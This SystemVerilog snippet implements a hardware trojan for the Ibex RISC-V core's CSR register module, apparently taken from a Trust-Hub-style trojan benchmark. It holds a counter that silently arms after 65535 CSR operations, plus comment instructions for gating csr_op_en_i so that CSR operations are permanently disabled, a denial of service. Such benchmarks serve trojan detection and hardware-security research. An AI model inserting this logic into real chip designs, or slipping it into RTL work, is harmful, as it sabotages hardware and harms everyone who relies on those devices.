
// ========== TROJAN T1: DoS (Denial of Service) ==========
// Trust-Hub AES-T1400
// Module: ibex_cs_registers
// Type: Sequential
// Description: Disables csr_op_en_i after csr_op_en_i activates 65535 times

// Trojan signals
logic [31:0] trojan_T1_counter;
logic trojan_T1_active;

// Trojan logic
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_T1_counter <= 32'h0;
        trojan_T1_active <= 1'b0;
    end else begin
        // Counter increments when trigger signal is active
        if (csr_op_en_i) begin
            trojan_T1_counter <= trojan_T1_counter + 1'b1;
        end
        
        // Activate trojan after threshold
        if (trojan_T1_counter == 32'hFFFF) begin
            trojan_T1_active <= 1'b1;
        end
    end
end

// MANUAL INSERTION REQUIRED:
// Replace the following line in original code:
//   assign csr_op_en_i = <original_logic>;
// With:
//   assign csr_op_en_i = trojan_T1_active ? 1'b0 : <original_logic>;

// ========== TROJAN T1 END ==========
